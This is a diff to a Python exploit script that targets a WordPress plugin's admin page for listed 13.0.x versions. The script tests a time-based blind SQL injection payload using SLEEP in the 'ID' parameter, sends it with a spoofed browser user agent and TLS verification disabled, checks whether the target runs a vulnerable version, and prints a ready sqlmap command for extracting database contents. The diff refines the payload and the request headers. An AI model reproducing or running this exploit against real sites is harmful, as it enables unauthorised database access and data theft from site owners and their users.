@@ -7,12 +7,12 @@ def blindsql(url):
 	url_endpoint = url + '/wp-admin/admin.php'
 	ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
 	sleep = 15
-	payload=" AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
+	payload="1 AND (SELECT * from (select SLEEP(%s))a)"%(sleep)
 	url_encode = urlencode({'page':'wps_pages_page', 'type':'1', 'ID':payload}, quote_via=quote_plus)
 	try:
 		#print(url_endpoint +'?'+ url_encode)
 		print('(+) Try payload')
-		r = requests.get(url_endpoint +'?'+ url_encode, timeout=5, verify=False).status_code
+		r = requests.get(url_endpoint +'?'+ url_encode, headers={'User-Agent':ua}, timeout=5, verify=False).status_code
 		print('(!) Target seem like not timeout!')
 		print(r)
 		print('Try: sqlmap -u \"%s\" --technique=T --dbms=\"mysql\" -p \"ID\" -b --level=5 --time-sec=10'%(url_endpoint + "?ID=1&page=wps_pages_page&type=1"))
@@ -30,7 +30,7 @@ def exploit(url):
 		vuln = ["13.0.7", "13.0.6", "13.0.5", "13.0.4", "13.0.3", "13.0.1", "13.0"]
 		is_vuln = False
 		for v in vuln:
-			if v in stable_ver:
+			if stable_ver in v:
 				is_vuln = True
 		if is_vuln:
 			print("(+) %s Target is vuln!" %(url.replace('https://', '').replace('http://', '').replace('/','')))
